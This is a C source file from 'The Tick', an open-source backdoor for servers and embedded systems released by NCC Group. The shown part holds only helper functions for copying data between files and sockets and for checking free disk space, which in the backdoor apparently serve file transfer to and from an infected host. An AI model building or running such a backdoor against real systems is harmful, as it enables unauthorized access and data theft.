/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <fileapi.h>
#else
#include <sys/statvfs.h>
#endif

#include "common.h"
#include "file.h"

// Helper function to copy a file stream.
// Since uses low lever file descriptors it works with sockets too.
// Optional "count" parameter limits how many bytes to copy,
// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
int copy_stream(int source, int destination, ssize_t count)
{
    ssize_t copied = 0;
    ssize_t block = 0;
    char buffer[1024];

    if (count == 0) return 0;
    while (count < 0 || copied < count) {
        block = read(source, buffer, sizeof(buffer));
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            return -1;
        }
        if (block == 0) {
            return 0;
        }
        copied = copied + block;
        while (block > 0) {
            ssize_t tmp = write(destination, buffer, block);
            if (tmp <= 0) {
                return -1;
            }
            block = block - tmp;
        }
    }
    return 0;
}

// On Windows we cannot mix sockets and file descriptors.
// We need specialized functions for this.
#ifdef _WIN32

int copy_stream_socket_to_file(int sock, int fd, ssize_t count)
{
    ssize_t copied = 0;
    ssize_t block = 0;
    char buffer[1024];

    if (count == 0) return 0;
    while (count < 0 || copied < count) {
        block = (ssize_t) recv(sock, buffer, sizeof(buffer), 0);
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            return -1;
        }
        if (block == 0) {
            return 0;
        }
        copied = copied + block;
        while (block > 0) {
            ssize_t tmp = write(fd, buffer, block);
            if (tmp <= 0) {
                return -1;
            }
            block = block - tmp;
        }
    }
    return 0;
}

int copy_stream_file_to_socket(int fd, int sock, ssize_t count)
{
    ssize_t copied = 0;
    ssize_t block = 0;
    char buffer[1024];

    if (count == 0) return 0;
    while (count < 0 || copied < count) {
        block = read(fd, buffer, sizeof(buffer));
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            return -1;
        }
        if (block == 0) {
            return 0;
        }
        copied = copied + block;
        while (block > 0) {
            ssize_t tmp = (ssize_t) send(sock, buffer, block, 0);
            if (tmp <= 0) {
                return -1;
            }
            block = block - tmp;
        }
    }
    return 0;
}

#endif

// Helper function to get the free space available in a given mount point.
// Returns -1 on error.
ssize_t get_free_space(const char *pathname)
{
#ifdef _WIN32
    ULARGE_INTEGER free;
    free.QuadPart = 0;
    return GetDiskFreeSpaceExA(pathname, &free, NULL, NULL) == 0 ? -1 : (ssize_t) free.QuadPart;
#else
    struct statvfs svfs;
    if (statvfs(pathname, &svfs) < 0) return -1;
    return svfs.f_bfree * svfs.f_bsize;
#endif
}
